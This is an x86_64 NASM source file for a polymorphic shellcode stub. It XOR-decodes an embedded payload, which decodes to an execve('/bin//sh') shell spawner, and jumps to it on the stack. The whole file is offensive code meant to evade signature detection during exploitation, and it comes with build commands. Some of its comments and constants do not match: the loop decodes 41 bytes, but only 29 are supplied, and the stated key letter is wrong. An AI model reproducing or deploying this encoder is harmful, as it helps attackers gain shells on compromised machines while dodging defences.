;; Polymorphic shellcode x86_64
;; Zweisamekeit
;; 31/01/17

;; nasm -f elf64 polsh.asm -o polsh.o && ld -o polsh polsh.o

bits 64
segment .text
global _start
_start:
jmp short data ; push the xored shellcode on the stack
decrypt :
pop rsi ; adress of the first byte of the shellcode -> used by lodsb
sub rsp,0x29 ; allow [shellcode_size] bytes for the unxored shellcode -> to jump to the unxored shellcode
lea rdi, [rsp+0x0] ; first byte of the xored shellcode -> used by stosb
xor rdx, rdx 
push rdx
pop rbx 
mov dl, 0x29 ; shellcode size -> test variable
mov bl, 0x53 ; key ('N') (does not appears in the original shellcode to avoid \x00)
boucle : ; to decrypt
lodsb ; load the current byte [rsi] into eax ; rsi ++
xor eax, ebx ; unxor with the key
stosb ; store the unxored byte at [rdi] ; rdi ++
dec edx
jnz boucle ; again, since the shellcode is not fully unxored
jmp rsp ; jump to the unxored shellcode
xor rax,rax
push 60 ; exit
pop rax
syscall
data :
call decrypt
shellcode: db  0x1b ,0x62 ,0xac ,0x04 ,0x04 ,0x0d ,0x09 ,0x1b ,0xec ,0x7c ,0x7c ,0x31 ,0x3a ,0x3d ,0x7c ,0x20 ,0x3b ,0x1b ,0x92 ,0xbc ,0x5b ,0x04 ,0x07 ,0x0c ,0x39 ,0x68 ,0x0b ,0x5c ,0x56
